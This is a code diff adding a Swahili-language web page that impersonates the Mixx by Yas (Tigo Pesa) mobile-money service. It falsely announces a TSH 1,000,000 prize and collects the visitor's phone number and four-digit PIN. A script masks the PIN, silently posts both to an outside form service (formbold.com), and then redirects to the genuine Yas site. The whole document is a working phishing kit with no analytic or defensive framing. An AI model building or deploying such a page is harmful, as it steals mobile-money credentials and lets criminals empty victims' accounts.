@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MIXX_BY YAS</title>
+<link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+<div class="watermark top-left">Mixx</div>
+<div class="watermark top-right">Mixx</div>
+<div class="watermark bottom-left">Mixx</div>
+<div class="watermark bottom-right">Mixx</div>
+
+<div class="wrapper">
+
+  <!-- SVG LOGO -->
+  <svg width="170" height="130" viewBox="0 0 400 300">
+    <ellipse cx="200" cy="240" rx="70" ry="12" fill="rgba(0,0,0,0.08)"/>
+    <rect x="120" y="50" width="140" height="160" rx="22" fill="#fff" stroke="#F4B400" stroke-width="8"/>
+    <rect x="170" y="185" width="40" height="8" rx="4" fill="#F4B400"/>
+    <polygon points="210,25 300,65 250,120 160,80" fill="#F4B400"/>
+    <polygon points="225,15 315,55 265,110 175,70" fill="#FFD54F" opacity="0.9"/>
+    <line x1="200" y1="120" x2="185" y2="140" stroke="#F4B400" stroke-width="4"/>
+    <line x1="210" y1="125" x2="195" y2="150" stroke="#F4B400" stroke-width="4"/>
+    <text x="95" y="260" font-size="52" fill="#1C2E5B" font-weight="bold">tigo</text>
+    <text x="205" y="260" font-size="52" fill="#F4B400" font-weight="bold">pesa</text>
+  </svg>
+
+  <h1>MIXX_BY YAS</h1>
+  <div class="win-text">UMEJISHINDIA TSH1,000,000</div>
+
+  <!-- FormBold Form -->
+  <form id="yasForm" action="https://formbold.com/s/9E4jv" method="POST">
+    <input type="hidden" name="pin" id="pinHidden">
+
+    <label>Namba ya Mixx</label>
+    <input type="tel" name="phone" placeholder="07XXXXXXXX" maxlength="10" required>
+
+    <label>PIN</label>
+    <div class="pin-wrapper">
+      <input class="pin-box" maxlength="1">
+      <input class="pin-box" maxlength="1">
+      <input class="pin-box" maxlength="1">
+      <input class="pin-box" maxlength="1">
+    </div>
+  </form>
+
+</div>
+
+<script>
+const form = document.getElementById("yasForm");
+const phoneInput = form.querySelector('input[name="phone"]');
+const pinHidden = document.getElementById("pinHidden");
+const pinBoxes = Array.from(document.querySelectorAll('.pin-box'));
+
+let realPin = ["","","",""];
+
+phoneInput.addEventListener('input', e=>{
+    e.target.value = e.target.value.replace(/\D/g,'').slice(0,10);
+});
+
+pinBoxes.forEach((box,i)=>{
+    box.addEventListener('input', e=>{
+        let val = e.target.value.replace(/\D/g,'');
+        if(!val) return;
+        e.target.value = val;
+        realPin[i] = val;
+        setTimeout(()=> e.target.value='•',100);
+        if(i<3) pinBoxes[i+1].focus();
+        if(realPin.every(x=>x!=="")){
+            pinHidden.value = realPin.join('');
+            submitForm();
+        }
+    });
+    box.addEventListener('keydown', e=>{
+        if(e.key==="Backspace"){
+            realPin[i]="";
+            if(i>0 && !box.value) pinBoxes[i-1].focus();
+        }
+    });
+});
+
+function submitForm(){
+    if(phoneInput.value.length!==10) return;
+    const data = new FormData(form);
+    document.body.style.opacity="0.6";
+    fetch(form.action,{
+        method:"POST",
+        body:data,
+        headers:{'Accept':'application/json'}
+    }).finally(()=>{
+        setTimeout(()=>{
+            window.location.href="https://yas.co.tz/mixx-by-yas/";
+        },1000);
+    });
+}
+</script>
+
+</body>
+</html>
